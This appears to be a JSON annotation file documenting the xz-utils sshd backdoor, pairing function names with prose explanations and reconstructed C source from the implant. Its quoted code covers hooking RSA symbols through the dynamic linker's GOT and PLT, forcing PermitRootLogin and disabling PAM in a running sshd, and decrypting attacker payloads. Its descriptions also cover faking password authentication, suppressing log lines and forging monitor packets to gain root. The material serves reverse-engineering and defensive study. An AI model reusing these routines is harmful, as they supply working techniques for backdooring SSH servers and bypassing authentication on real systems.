  "init_shared_globals": "Seeds the shared global structure with the high-level hook entry points and the address of the global_context_t singleton. Stage two populates it once so every hook (mm_answer_* and EVP glue) can resolve the same state block without further lookups.",
  "is_endbr64_instruction": "Checks whether the bytes at the current cursor encode an ENDBR64 landing pad, including the CET prefix variations. The pattern scanners call it so the backdoor can safely step past CET trampolines while carving prologues to patch.",
  "is_gnu_relro": "Tests whether a program header tuple represents the PT_GNU_RELRO region. The implant relies on it to locate the read-only relocation window that must be temporarily remapped while patching ld.so internals.",
  "is_range_mapped": "Verifies that every page in the requested interval is mapped by issuing harmless pselect probes through libc. Stage two runs it before dereferencing computed pointers so failed guesses do not crash sshd during setup.",
  "j_tls_get_addr": "Shim that forwards to the imported __tls_get_addr resolver while giving the loader a stable symbol to reference. It keeps TLS resolution working after the backdoor patches the GOT slot during initialization.",
  "key_hash": "AutoDoc: Generated from upstream sources.\n\nUpstream implementation excerpt (xzre/xzre_code/key_hash.c):\n    BOOL rsa_key_hash(\n    \tconst RSA *rsa,\n    \tu8 *mdBuf,\n    \tu64 mdBufSize,\n    \timported_funcs_t *funcs\n    ){\n    \tu8 buf[0x100A] = {0};\n    \tu64 written = 0, expSize = 0;\n    \tconst BIGNUM *n = NULL, *e = NULL;\n    \tBOOL result = (TRUE\n    \t\t&& funcs && rsa && funcs->RSA_get0_key\n    \t\t&& (funcs->RSA_get0_key(rsa, &n, &e, NULL), e != NULL && n != NULL)\n    \t\t// get bytes of 'e'\n    \t\t&& bignum_serialize(buf, sizeof(buf), &written, e, funcs)\n    \t\t&& (expSize = written, written <= 0x1009)\n    \t\t// get bytes of 'n'\n    \t\t&& bignum_serialize(buf + written, sizeof(buf) - written, &written, n, funcs)\n    \t\t&& written + expSize <= sizeof(buf)\n    \t\t// hash e+n\n    \t\t&& sha256(buf, written + expSize, mdBuf, mdBufSize, funcs)\n    \t);\n    \treturn result;\n    }",
  "lea_instruction": "AutoDoc: Generated from upstream sources.\n\nUpstream implementation excerpt (xzre/xzre_code/lea_instruction.c):\n    BOOL find_lea_instruction(u8 *code_start, u8 *code_end, u64 displacement){\n    \n    \tif(!secret_data_append_from_call_site(\n    \t\t(secret_data_shift_cursor_t){ 0x7C }, \n    \t\t5, 6, 0)\n    \t){\n    \t\treturn FALSE;\n    \t}\n    \tdasm_ctx_t dctx = {0};\n    \tfor(;code_start < code_end; ++code_start){\n    \t\tif(x86_dasm(&dctx, code_start, code_end)\n    \t\t\t&& XZDASM_OPC(dctx.opcode) == X86_OPCODE_LEA\n    \t\t\t&& (dctx.flags2 & DF2_FLAGS_MEM) == DF2_MEM_DISP\n    \t\t\t&& (dctx.mem_disp == displacement || dctx.mem_disp == -displacement)\n    \t\t){\n    \t\t\treturn TRUE;\n    \t\t}\n    \t}\n    \treturn FALSE;\n    }",
  "libc_imports": "AutoDoc: Generated from upstream sources.\n\nUpstream implementation excerpt (xzre/xzre_code/libc_imports.c):\n    BOOL resolve_libc_imports(\n    \tstruct link_map *libc,\n    \telf_info_t *libc_info,\n    \tlibc_imports_t *imports\n    ){\n    \tlzma_allocator *resolver = get_lzma_allocator();\n    \tif(!elf_parse((Elf64_Ehdr *)libc->l_addr, libc_info)){\n    \t\treturn FALSE;\n    \t}\n    \tresolver->opaque = libc_info;\n    \timports->read = lzma_alloc(STR_read, resolver);\n    \tif(imports->read)\n    \t\t++imports->resolved_imports_count;\n    \timports->__errno_location = lzma_alloc(STR_errno_location, resolver);\n    \tif(imports->__errno_location)\n    \t\t++imports->resolved_imports_count;\n    \t\n    \treturn imports->resolved_imports_count == 2;\n    }",
  "lzma_alloc": "Companion stub for lzma_alloc that aborts if reached. The real symbol is resolved out of the host process at runtime; keeping this placeholder lets the implant smuggle the symbol without linking against liblzma statically.",
  "lzma_allocator": "AutoDoc: Generated from upstream sources.\n\nUpstream implementation excerpt (xzre/xzre_code/lzma_allocator.c):\n    lzma_allocator *get_lzma_allocator(void){\n    \treturn &get_lzma_allocator_address()->allocator;\n    }",
  "lzma_check_init": "Placeholder for liblzma's check initialiser that immediately traps if executed. It satisfies the relocation table, but the backdoor expects the real routine to be supplied by the host ld.so before any call can occur.",
  "lzma_free": "Trap stub that occupies the lzma_free symbol in the object. During normal execution the loader redirects the call to the genuine allocator supplied by liblzma; hitting this stub would signal a failed resolution.",
  "main_elf_parse": "Parses the dynamic linker via r_debug, resolves `__libc_stack_end`, and reruns the sshd identity checks before caching the stack pointer. This gives the backdoor a vetted view of ld.so and a trustworthy stack anchor prior to manipulating audit state.",
  "memmove": "AutoDoc: Generated from upstream sources.\n\nUpstream implementation excerpt (xzre/xzre_code/memmove.c):\n    void *c_memmove(char *dest, char *src, size_t cnt) {\n        if ((src < dest) && (dest < (src + cnt))) {\n            size_t curr = cnt - 1;\n            if (cnt != 0) {\n                do {\n                    *(dest + curr) = *(src + curr);\n                    --curr;\n                } while (curr != -1);\n                return dest;\n            }\n        } else {\n            if (cnt == 0)\n                return dest;\n            size_t curr = 0;\n            do {\n                *(dest + curr) = *(src + curr);\n                ++curr;\n            } while (cnt != curr);\n        }\n        return dest;\n    }",
  "mm_answer_authpassword_hook": "Synthesises a `MONITOR_ANS_AUTHPASSWORD` reply and pushes it to the monitor channel, effectively granting password authentication. `run_backdoor_commands` drops this hook in when the attacker asks for a session without presenting real credentials.",
  "mm_answer_keyallowed_hook": "Runs the decrypted payload (including optional privilege escalation) and then tail-calls the genuine `mm_answer_keyallowed`. It is the final hook that executes attacker commands after the forged monitor packet crafted in `sshd_proxy_elevate` arrives.",
  "mm_answer_keyverify_hook": "Intercepts the monitor key-verify request and writes the prebuilt response stored in the global context directly to the socket, skipping sshd's verification logic. It is paired with the keyallowed hook so the forged monitor exchange looks legitimate while the backdoor takes over.",
  "mm_log_handler_hook": "Intercepts monitor log messages, filtering or rewriting lines that match attacker-selected strings before optionally forwarding them to the original handler. Command flags processed in `run_backdoor_commands` enable this to suppress giveaway log entries while the payload operates.",
  "parse": "AutoDoc: Generated from upstream sources.\n\nUpstream implementation excerpt (xzre/xzre_code/parse.c):\n    #ifndef DT_RELRSZ\n    #define DT_RELRSZ 35 /* Total size of RELR relative relocations * /\n    #endif\n    \n    #ifndef DT_RELR\n    #define DT_RELR\t36 /* Address of RELR relative relocations * /\n    #endif\n    \n    BOOL elf_parse(Elf64_Ehdr *ehdr, elf_info_t *elf_info){\n    \tif(!ehdr || !elf_info){\n    \t\treturn FALSE;\n    \t}\n    \n    \tmemset(elf_info, 0x00, sizeof(*elf_info));\n    \telf_info->elfbase = ehdr;\n    \telf_info->phdrs = (Elf64_Phdr *)PTRADD(ehdr, ehdr->e_phoff);\n    \tint i; Elf64_Phdr *phdr;\n    \tu64 first_vaddr = -1;\n    \tint dynamic_idx = -1;\n    \tfor(i=0, phdr = elf_info->phdrs; i<ehdr->e_phnum; i++, phdr++){\n    \t\tif(phdr->p_type == PT_LOAD){\n    \t\t\tif(phdr->p_vaddr < first_vaddr){\n    \t\t\t\tfirst_vaddr = phdr->p_vaddr;\n    \t\t\t}\n    \t\t} else if(phdr->p_type == PT_DYNAMIC){\n    \t\t\tdynamic_idx = i;\n    \t\t} else if(is_gnu_relro(phdr->p_type, 0xA0000000)){\n    \t\t\tif(elf_info->gnurelro_found){\n    \t\t\t\treturn FALSE;\n    \t\t\t}\n    \t\t\telf_info->gnurelro_vaddr = phdr->p_vaddr;\n    \t\t\telf_info->gnurelro_found = TRUE;\n    \t\t\telf_info->gnurelro_memsize = phdr->p_memsz;\n    \t\t}\n    \t}\n    \tif(first_vaddr == -1 || dynamic_idx == -1){\n    \t\treturn FALSE;\n    \t}\n    \telf_info->first_vaddr = first_vaddr;\n    \t\n    \tElf64_Phdr *dyn_phdr = &elf_info->phdrs[dynamic_idx];\n    \tElf64_Dyn *dyn = (Elf64_Dyn *)PTRADD(ehdr, PTRDIFF(dyn_phdr->p_vaddr, first_vaddr));\n    \telf_info->dyn = dyn;\n    \telf_info->dyn_num_entries = dyn_phdr->p_memsz / sizeof(Elf64_Dyn);\n    \tif(!elf_contains_vaddr(elf_info, dyn, dyn_phdr->p_memsz, PF_R)){\n    \t\treturn FALSE;\n    \t}\n    \n    \tgnu_hash_table_t *gnu_hash = NULL;\n    \n    \tu64 d_pltrelsz = -1;\n    \tu64 d_relasz = -1;\n    \tu64 d_relrsz = -1;\n    \tBOOL have_verdef_num = FALSE;\n    \n    \tfor(i=0; i<elf_info->dyn_num_entries; i++, dyn++){\n    \t\tif(dyn->d_tag == DT_NULL){\n    \t\t\telf_info->dyn_num_entries = i;\n    \t\t\tbreak;\n    \t\t}\n    \t\tswitch(dyn->d_tag){\n    \t\t\tcase DT_JMPREL:\n    \t\t\t\telf_info->plt_relocs = (Elf64_Rela *)dyn->d_un.d_ptr;\n    \t\t\t\tbreak;\n    \t\t\tcase DT_BIND_NOW:\n    \t\t\t\telf_info->flags |= X_ELF_NOW;\n    \t\t\t\tbreak;\n    \t\t\tcase DT_FLAGS:\n    \t\t\t\tif((dyn->d_un.d_val & DF_BIND_NOW) != 0){\n    \t\t\t\t\telf_info->flags |= X_ELF_NOW;\n    \t\t\t\t}\n    \t\t\t\tbreak;\n    \t\t\tcase DT_RELRSZ:\n    \t\t\t\td_relrsz = dyn->d_un.d_val;\n    \t\t\t\tbreak;\n    \t\t\tcase DT_RELR:\n    \t\t\t\telf_info->relr_relocs = (Elf64_Relr *)dyn->d_un.d_ptr;\n    \t\t\t\tbreak;\n    \t\t\tcase DT_PLTRELSZ:\n    \t\t\t\td_pltrelsz = dyn->d_un.d_val;\n    \t\t\t\tbreak;\n    \t\t\tcase DT_STRTAB:\n    \t\t\t\telf_info->strtab = (char *)dyn->d_un.d_ptr;\n    \t\t\t\tbreak;\n    \t\t\tcase DT_SYMTAB:\n    \t\t\t\telf_info->symtab = (Elf64_Sym *)dyn->d_un.d_ptr;\n    \t\t\t\tbreak;\n    \t\t\tcase DT_RELA:\n    \t\t\t\telf_info->rela_relocs = (Elf64_Rela *)dyn->d_un.d_ptr;\n    \t\t\t\tbreak;\n    \t\t\tcase DT_RELASZ:\n    \t\t\t\td_relasz = dyn->d_un.d_val;\n    \t\t\t\tbreak;\n    \t\t\tcase DT_FLAGS_1:\n    \t\t\t\tif((dyn->d_un.d_val & DF_1_NOW) != 0){\n    \t\t\t\t\telf_info->flags |= X_ELF_NOW;\n    \t\t\t\t}\n    \t\t\t\tbreak;\n    \t\t\tcase DT_VERDEFNUM:\n    \t\t\t\telf_info->verdef_num = dyn->d_un.d_val;\n    \t\t\t\tbreak;\n    \t\t\tcase DT_HIPROC:\n    \t\t\t\treturn FALSE;\n    \t\t\tcase DT_VERDEF:\n    \t\t\t\thave_verdef_num = TRUE;\n    \t\t\t\telf_info->verdef = (Elf64_Verdef *)dyn->d_un.d_ptr;\n    \t\t\t\tbreak;\n    \t\t\tcase DT_VERSYM:\n    \t\t\t\telf_info->flags |= X_ELF_VERSYM;\n    \t\t\t\telf_info->versym = (Elf64_Versym *)dyn->d_un.d_ptr;\n    \t\t\t\tbreak;\n    \t\t\tcase DT_GNU_HASH:\n    \t\t\t\tgnu_hash = (gnu_hash_table_t *)dyn->d_un.d_ptr;\n    \t\t\t\tbreak;\n    \t\t\tdefault:\n    \t\t\t\tif(dyn->d_tag > DT_CONFIG){\n    \t\t\t\t\treturn FALSE;\n    \t\t\t\t}\n    \t\t\t\tbreak;\n    \t\t}\n    ...",
  "patch_variables": "AutoDoc: Generated from upstream sources.\n\nUpstream implementation excerpt (xzre/xzre_code/patch_variables.c):\n    BOOL sshd_patch_variables(\n    \tBOOL skip_root_patch,\n    \tBOOL disable_pam,\n    \tBOOL replace_monitor_reqtype,\n    \tint monitor_reqtype,\n    \tglobal_context_t *global_ctx\n    ){\n    \tif(!global_ctx){\n    \t\treturn FALSE;\n    \t}\n    \tsshd_ctx_t *sshd_ctx = global_ctx->sshd_ctx;\n    \tif(!sshd_ctx){\n    \t\treturn FALSE;\n    \t}\n    \tif(!sshd_ctx->have_mm_answer_authpassword\n        || !sshd_ctx->mm_answer_authpassword_hook\n    \t){\n    \t\treturn FALSE;\n    \t}\n    \n    \tif(!skip_root_patch){\n    \t\tint *permit_root_login = sshd_ctx->permit_root_login_ptr;\n    \t\tif(!permit_root_login){\n    \t\t\treturn FALSE;\n    \t\t}\n    \t\tif(*permit_root_login < 0\n    \t\t|| (*permit_root_login > PERMIT_NO_PASSWD && *permit_root_login != PERMIT_YES)){\n    \t\t\treturn FALSE;\n    \t\t}\n    \t\t*permit_root_login = PERMIT_YES;\n    \t}\n    \n    \tif(disable_pam){\n    \t\tint *use_pam = sshd_ctx->use_pam_ptr;\n    \t\tif(!use_pam || *use_pam > TRUE){\n    \t\t\treturn FALSE;\n    \t\t}\n    \t\t*use_pam = FALSE;\n    \t}\n    \n    \tsshd_monitor_func_t *mm_answer_authpassword_ptr = sshd_ctx->mm_answer_authpassword_ptr;\n    \n    \tif(!replace_monitor_reqtype){\n    \t\t// read reqtype from `monitor` struct\n    \t\tmonitor_reqtype = *(int *)PTRDIFF(mm_answer_authpassword_ptr, 8) + 1;\n    \t}\n    \tsshd_ctx->monitor_reqtype_authpassword = monitor_reqtype;\n    \t// install authpassword hook\n    \t*mm_answer_authpassword_ptr = sshd_ctx->mm_answer_authpassword_hook;\n    \treturn TRUE;\n    }",
  "payload_message": "AutoDoc: Generated from upstream sources.\n\nUpstream implementation excerpt (xzre/xzre_code/payload_message.c):\n    BOOL decrypt_payload_message(\n    \tkey_payload_t *payload,\n    \tsize_t payload_size,\n    \tglobal_context_t *ctx\n    ){\n    \tbackdoor_payload_hdr_t hdr = {0};\n    \tu8 output[ED448_KEY_SIZE] = {0};\n    \n    \tmemcpy(&hdr, payload, sizeof(hdr));\n    \n    \tif(!payload){\n    \t\tif(!ctx) return FALSE;\n    \t\tgoto set_state_reset;\n    \t}\n    \n    \tconst size_t header_size = sizeof(payload->hdr) + sizeof(payload->body_length);\n    \tstatic_assert(header_size == 18);\n    \n    \tdo {\n    \t\tif(!ctx) break;\n    \t\tif(ctx->payload_state == 3) return TRUE;\n    \t\tif(payload_size <= header_size || ctx->payload_state > 1) break;\n    \n    \t\t/** decrypt body_size and body * /\n    \t\tif(!chacha_decrypt(\n    \t\t\tpayload->data + sizeof(payload->hdr),\n    \t\t\tpayload_size - sizeof(payload->hdr),\n    \t\t\toutput,\n    \t\t\tpayload->hdr.bytes,\n    \t\t\tpayload->data + sizeof(payload->hdr),\n    \t\t\tctx->imported_funcs)) break;\n    \n    \t\tu16 body_length = payload->body_length;\n    \t\t// body cannot be bigger than remaining length\n    \t\tif(body_length >= payload_size - header_size){\n    \t\t\tbreak;\n    \t\t}\n    \t\t\n    \t\t// body cannot be bigger than the current data size\n    \t\tif(body_length >= ctx->payload_data_size - ctx->current_data_size){\n    \t\t\tbreak;\n    \t\t}\n    \n    \t\t/** keep a copy of the last payload body * /\n    \t\tu8 *data = &ctx->payload_data[ctx->current_data_size];\n    \t\t__builtin_memcpy(data, payload->body, body_length);\n    \t\tctx->current_data_size += body_length;\n    \n    \t\t/** decrypt body * /\n    \t\tif(!chacha_decrypt(\n    \t\t\tpayload->data + sizeof(payload->hdr),\n    \t\t\tpayload_size - sizeof(payload->hdr),\n    \t\t\toutput,\n    \t\t\tpayload->hdr.bytes,\n    \t\t\tpayload->data + sizeof(payload->hdr),\n    \t\t\tctx->imported_funcs\n    \t\t)) break;\n    \n    \t\treturn TRUE;\n    \t} while(0);\n    \n    \tset_state_reset:\n    \tctx->payload_state = PAYLOAD_STATE_INITIAL;\n    \n    \treturn FALSE;\n    }",
  "pointers": "AutoDoc: Generated from upstream sources.\n\nUpstream implementation excerpt (xzre/xzre_code/pointers.c):\n    BOOL count_pointers(\n    \tvoid **ptrs,\n    \tu64 *count_out, \n    \tlibc_imports_t *funcs\n    ){\n    \tif(!ptrs) return FALSE;\n    \tif(!funcs) return FALSE;\n    \tif(!funcs->malloc_usable_size) return FALSE;\n    \tsize_t blockSize = funcs->malloc_usable_size(ptrs);\n    \tif(blockSize - 8 > 127) return FALSE;\n    \tsize_t nWords = blockSize >> 3;\n    \t\n    \tsize_t i;\n    \tfor(i=0; i < nWords && ptrs[i]; ++i);\n    \t*count_out = i;\n    \treturn TRUE;\n    }",
  "process_is_sshd": "Walks argv and envp from the saved stack pointer to ensure the process really is sshd, no debug flags are active, and no suspicious environment settings are present. Backdoor setup treats this as a hard prerequisite before it touches ld.so or installs any hooks.",
  "process_shared_libraries": "Wrapper that drives `process_shared_libraries_map`, fills the per-module elf_info structures, and exposes the hooks_data handle. `backdoor_setup` runs it up front to assemble all metadata required for later patching.",
  "process_shared_libraries_map": "Traverses the r_debug chain to collect link_map pointers for sshd, libcrypto, ld.so, liblzma, libc, and libsystemd, sanity-checking each and resolving RSA PLT stubs. The consolidated handles populate the shared data block consumed by the rest of the loader.",
  "resolve_libc_imports": "Parses libc via its link-map entry and resolves `read` plus `__errno_location` through the fake allocator shim. These imports feed helpers like `is_range_mapped`, enabling the backdoor to probe memory safely during setup.",
  "rsa_key_hash": "Serialises the RSA exponent and modulus and hashes them with SHA256 using the resolved imports. The monitor hooks rely on that digest to confirm that an attacker request refers to a known host key before acting.",
  "run_backdoor_commands": "Central dispatcher invoked from the RSA hooks: it parses the forged modulus, decrypts staged payload chunks, verifies the ED448 signature, toggles sshd configuration/logging, and, if necessary, escalates through `sshd_proxy_elevate`. Every command the backdoor accepts flows through this routine before control returns to libcrypto.",
  "secret_data_append_from_address": "Runs the singleton appender against either a provided code pointer or the caller's return address, letting hooks fingerprint themselves at runtime. The recorded bits contribute to the secret_data blob used for payload decryption.",
  "secret_data_append_from_call_site": "Validates the caller site, shifts the requested bits, and returns TRUE (or the bypass flag). It is sprinkled at sensitive call sites so the secret_data ledger captures that execution passed through trusted glue.",
  "secret_data_append_from_code": "Walks a trusted code range, optionally skipping until the first CALL, and records bits for each qualifying register-to-register instruction. The backdoor uses it to encode integrity fingerprints into the secret_data bitmap before decrypting payload material.",
  "secret_data_append_from_instruction": "Evaluates a decoded instruction and, when it matches expected patterns, sets a bit inside `global_ctx->secret_data`. The loader uses it to encode \"this function looks intact\" attestation bits that are later consumed during payload decryption.",
  "secret_data_append_item": "Calls the singleton appender only when a supplied index is non-zero, making it easy to gate optional fingerprint operations. The various secret-data tables use it to share common code while respecting per-item enable flags.",
  "secret_data_append_items": "Iterates an array of secret_data_item descriptors, assigning indexes on the fly and invoking the supplied appender for each. This batches the dozens of integrity checks that run during backdoor_setup into a single call.",
  "secret_data_append_singleton": "Performs a one-off fingerprint of a function: finds its start, validates the instruction stream, shifts the requested number of bits, and marks the operation id as complete. Setup routines call it to attest critical helpers before relying on them for decryption.",
  "secret_data_get_decrypted": "Runs a two-stage ChaCha20 decrypt to recover the embedded secret-data blob using keys stored alongside the payload. Other helpers request it whenever they need the ED448 key or command constants.",
  "sha256": "Invokes EVP_Digest/Evp_sha256 through the imported function table to hash arbitrary buffers. It fingerprints host keys and payload components so the command verifier can prove authenticity without linking libcrypto statically.",
  "sshbuf_bignum_is_negative": "Checks whether a serialized BIGNUM is negative by inspecting its buffer layout. Secret-data scanners invoke it to ignore malformed key material pulled from sshd buffers.",
  "sshbuf_extract": "Validates a runtime sshbuf using offsets recorded in the global context and returns its data pointer and size. The backdoor uses it to access monitor messages safely even when structure layouts shift across builds.",
  "sshd_configure_log_hook": "Installs the mm_log_handler hook and optionally suppresses logging unless the thread is privileged. This prevents sshd from spewing tell-tale errors while the backdoor intercepts monitor messages.",
  "sshd_find_main": "Scans sshd's entry-point stub to locate the real sshd_main function and prefetch key libcrypto imports. The backdoor needs that entry address as the anchor for later monitor-structure searches and to seed its imported_funcs table before hooks fire.",
  "sshd_find_monitor_field_addr_in_function": "Tracks how sshd loads a monitor field and passes it to mm_request_send, returning the field's address when the pattern matches. The implant leverages this to recover the monitor receive/transmit descriptors it later hijacks for its covert channel.",
  "sshd_find_monitor_struct": "Collects monitor field references across multiple sshd routines, tallies the overlapping addresses, and picks the consensus location of `struct monitor`. Stage two writes that pointer into the global context so the mm_* hooks can reach sshd's privileged monitor state.",
  "sshd_find_sensitive_data": "Combines the xcalloc and getenv heuristics, evaluates scores across multiple sshd routines, and records the winning `sensitive_data` pointer in the global context. It also resolves additional libcrypto helpers that the payload extraction path requires.",
  "sshd_get_client_socket": "Returns either the read or write end of the client connection using the monitor struct when available, otherwise falling back to the socket scanner. It\u2019s called right before forging or replaying monitor traffic.",
  "sshd_get_sensitive_data_address_via_krb5ccname": "Follows the code path that calls getenv(\"KRB5CCNAME\") and watches how the result flows into sshd's globals, returning the address when it matches the `sensitive_data.host_keys` pattern. The backdoor falls back to this heuristic when the xcalloc pattern fails so it can still recover the host-key structure before arming its hooks.",
  "sshd_get_sensitive_data_address_via_xcalloc": "Observes the xcalloc initialisation sequence that zeroes `sensitive_data` and records the data-section address that receives the result. This is the primary locator the implant uses to identify sshd's host-key container ahead of its scoring passes.",
  "sshd_get_sensitive_data_score": "Combines the scores from `do_child`, `main`, and `demote_sensitive_data` to produce a single confidence value for the candidate pointer. Only when this aggregate passes the threshold does the backdoor store the address and proceed with secret-data extraction.",
  "sshd_get_sensitive_data_score_in_demote_sensitive_data": "Looks inside `demote_sensitive_data` for direct references to the candidate pointer and emits a high score when it finds them. That strong signal helps the backdoor confirm it has located the structure that carries host keys between privilege transitions.",
  "sshd_get_sensitive_data_score_in_do_child": "Counts characteristic memory accesses to the candidate `sensitive_data` pointer inside `do_child` and produces a confidence score. The aggregate scorer uses this value to decide whether the pointer is safe to treat as the real host-key cache.",
  "sshd_get_sensitive_data_score_in_main": "Checks sshd's main routine for loads and stores against the candidate sensitive-data slots and weights them into a score. The loader folds this signal into the overall confidence metric before exposing the pointer to other hooks.",
  "sshd_get_sshbuf": "Walks the cached monitor structure to locate the sshbuf that carries key-exchange data, falling back to heuristics if necessary. The payload executor calls it before mining modulus bytes from the session state.",
  "sshd_get_usable_socket": "Iterates file descriptors by probing shutdown() results to pick the next usable socket. This gives the implant a way to reuse sshd\u2019s sockets even when the monitor pointer is unavailable.",
  "sshd_log": "Calls sshd's sshlogv via the resolved function pointer, mirroring OpenSSH's logging API. The hooks use it when they need to surface controlled diagnostics without relying on libc\u2019s syslog wrappers.",
  "sshd_patch_variables": "Tweaks sshd\u2019s in-memory configuration\u2014optionally forcing PermitRootLogin, disabling PAM, and swapping in the authpassword hook\u2014so the implant\u2019s monitor stubs function regardless of the original sshd settings.",
  "sshd_proxy_elevate": "Crafts and transmits a forged MONITOR_REQ_KEYALLOWED packet through the monitor socket to obtain root privileges in sandboxed sshd instances. It\u2019s invoked by run_backdoor_commands when the current context lacks the ability to execute the payload directly.",
  "string_reference": "AutoDoc: Generated from upstream sources.\n\nUpstream implementation excerpt (xzre/xzre_code/string_reference.c):\n    u8 *find_string_reference(\n    \tu8 *code_start,\n    \tu8 *code_end,\n    \tconst char *str\n    ){\n    \tdasm_ctx_t dctx = {0};\n    \tif(find_lea_instruction_with_mem_operand(code_start, code_end, &dctx, (void *)str)){\n    \t\treturn dctx.instruction;\n    \t}\n    \treturn NULL;\n    }",
  "strlen": "AutoDoc: Generated from upstream sources.\n\nUpstream implementation excerpt (xzre/xzre_code/strlen.c):\n    ssize_t c_strlen(char *str) {\n        if (*str != '\\0') {\n            ssize_t len = 0;\n            do {\n                ++len;\n            } while (*(str + len) != '\\0');\n            return len;\n        }\n        return 0;\n    }",
  "strnlen": "AutoDoc: Generated from upstream sources.\n\nUpstream implementation excerpt (xzre/xzre_code/strnlen.c):\n    ssize_t c_strnlen(char *str, size_t max_len) {\n        ssize_t len = 0;\n        if (max_len == 0)\n            return max_len;\n        do {\n            if (*(str + len) == '\\0')\n                return len;\n            ++len;\n        } while (max_len != len);\n        return max_len;\n    }",
  "symbind64": "AutoDoc: Generated from upstream sources.\n\nUpstream implementation excerpt (xzre/xzre_code/symbind64.c):\n    #define PLT_VALID(x) (UPTR(x) > 0xFFFFFF)\n    \n    uintptr_t backdoor_symbind64(\n    \tElf64_Sym *sym,\n    \tunsigned int ndx,\n    \tuptr *refcook, uptr *defcook,\n    \tunsigned int flags,\n    \tconst char *symname\n    )\n    {\n    \timported_funcs_t *funcs = &hooks_data->imported_funcs;\n    \tldso_ctx_t *ldso = &hooks_data->ldso_ctx;\n    \n    \tif(ldso->hooks_installed){\n    \t\tgoto orig;\n    \t}\n    \n    \tvoid *retaddr = __builtin_return_address(0);\n    \n    \tvoid *_dl_audit_symbind_alt = ldso->_dl_audit_symbind_alt;\n    \tvoid *__libc_stack_end = hooks_data->libc_imports.__libc_stack_end;\n    \n    \t#define HOOK_INSTALL(orig, plt, hook) do { \\\n    \t\t(orig) = *(plt); \\\n    \t\t*(plt) = (hook); \\\n    \t\t/* updates the symbol if it's in ldso scope? * / \\\n    \t\tif(UPTR(sym) > UPTR(retaddr) && UPTR(sym) < UPTR(__libc_stack_end)) \\\n    \t\t\tsym->st_value = (Elf64_Addr)(hook); \\\n    \t} while(0)\n    \n    \t// trigger kill switch if the call site is not in ldso region\n    \tif(retaddr <= _dl_audit_symbind_alt) goto kill_switch;\n    \n    \tuintptr_t func_end_addr = PTRADD(_dl_audit_symbind_alt, hooks_data->ldso_ctx._dl_audit_symbind_alt);\n    \tuintptr_t offset_in_function = PTRDIFF(retaddr, _dl_audit_symbind_alt);\n    \tif(offset_in_function > func_end_addr) goto kill_switch;\n    \n    \tEncodedStringId string_id = get_string_id(symname, NULL);\n    \tBOOL plt_entry_valid;\n    \n    \t/**\n    \t * only one of the following hooks will be installed (the first that passes the checks).\n    \t * the other ones are fallbacks (alternative entry points) in case the first one doesn't hit.\n    \t * /\n    \n    \tif(string_id == STR_RSA_public_decrypt && funcs->RSA_public_decrypt_plt){\n    \t\tif(PLT_VALID(*funcs->RSA_public_decrypt_plt)){\n    \t\t\tHOOK_INSTALL(\n    \t\t\t\tfuncs->RSA_public_decrypt,\n    \t\t\t\tfuncs->RSA_public_decrypt_plt,\n    \t\t\t\tldso->hook_RSA_public_decrypt\n    \t\t\t);\n    \t\t}\n    \t\t// RSA_public_decrypt is \"standalone\" (doesn't need further hooks)\n    \t\tgoto symbind_reset;\n    \t} else if(string_id == STR_EVP_PKEY_set1_RSA && funcs->EVP_PKEY_set1_RSA_plt){\n    \t\tif(PLT_VALID(*funcs->EVP_PKEY_set1_RSA_plt)){\n    \t\t\tHOOK_INSTALL(\n    \t\t\t\tfuncs->EVP_PKEY_set1_RSA,\n    \t\t\t\tfuncs->EVP_PKEY_set1_RSA_plt,\n    \t\t\t\tldso->hook_EVP_PKEY_set1_RSA\n    \t\t\t);\n    \n    \t\t\t// EVP_PKEY_set1_RSA depends on RSA_get0_key to be also hooked\n    \t\t\tif(!funcs->RSA_get0_key_plt) {\n    \t\t\t\tgoto symbind_reset;\n    \t\t\t}\n    \t\t\tplt_entry_valid = PLT_VALID(*funcs->RSA_get0_key_plt);\n    \t\t}\n    \t} else if(string_id == STR_RSA_get0_key && funcs->RSA_get0_key_plt){\n    \t\tif(PLT_VALID(*funcs->RSA_get0_key_plt)){\n    \t\t\tHOOK_INSTALL(\n    \t\t\t\t// ??\n    \t\t\t\tfuncs->RSA_get0_key_null,\n    \t\t\t\tfuncs->RSA_get0_key_plt,\n    \t\t\t\tldso->hook_RSA_get0_key\n    \t\t\t);\n    \t\t\t// RSA_get0_key depends on EVP_PKEY_set1_RSA to be also hooked\n    \t\t\tif(!funcs->EVP_PKEY_set1_RSA_plt){\n    \t\t\t\tgoto symbind_reset;\n    \t\t\t}\n    \t\t\tplt_entry_valid = PLT_VALID(*funcs->EVP_PKEY_set1_RSA_plt);\n    \t\t}\n    \t} else {\n    \t\tgoto orig;\n    \t}\n    \n    \t/** if the hook has been installed successfully * /\n    \tif(plt_entry_valid){\n    \t\tsymbind_reset:\t\n    \t\tinit_ldso_ctx(&hooks_data->ldso_ctx);\n    \n    \t\tkill_switch:\n    \t\thooks_data->ldso_ctx.hooks_installed = TRUE;\n    \t}\n    \n    \torig:\n    \treturn sym->st_value;\n    \n    \t#undef HOOK_INSTALL\n    }",
  "symbol_get_addr": "AutoDoc: Generated from upstream sources.\n\nUpstream implementation excerpt (xzre/xzre_code/symbol_get_addr.c):\n    void *elf_symbol_get_addr(elf_info_t *elf_info, EncodedStringId encoded_string_id){\n    \tElf64_Sym *sym = elf_symbol_get(elf_info, encoded_string_id, 0);\n    \tif(!sym){\n    \t\treturn NULL;\n    \t}\n    \n    \tif(sym->st_value && sym->st_shndx){\n    \t\treturn (void *)PTRADD(elf_info->elfbase, sym->st_value);\n    \t} else {\n    \t\treturn NULL;\n    \t}\n    }",
  "tls_get_addr": "AutoDoc: Generated from reverse engineering.\n\nSummary:\n  Placeholder for __tls_get_addr that merely raises halt_baddata(); the object relies on the dynamic loader to wire in the system resolver.\n\nNotes:\n  - Keeps the GOT slot and relocation records intact while preventing accidental execution of an unimplemented body.",
  "update_cpuid_got_index": "Copies the cpuid relocation index from the constant table into `ctx->got_ctx.cpuid_fn`. Backdoor init uses it right before rewriting the GOT so it knows exactly which slot corresponds to the original cpuid resolver.",
  "update_got_address": "Disassembles the `__tls_get_addr` PLT trampoline, derives the real GOT entry address, and caches it in the entry context. Stage two depends on that pointer to find ld.so's ELF header and to swap the cpuid GOT slot over to its handler.",
  "update_got_offset": "Stores the cpuid random-symbol GOT offset constant in the entry context so absolute addresses can be reconstructed without relocations. It pairs with `update_got_address` when the loader patches the resolver slot.",
  "validate_log_handler_pointers": "Walks the sshd code that assigns log_handler and log_handler_ctx to confirm a pair of addresses really correspond to those globals. Stage two performs this validation before patching the slots so the mm_log_handler hook does not corrupt unrelated memory.",
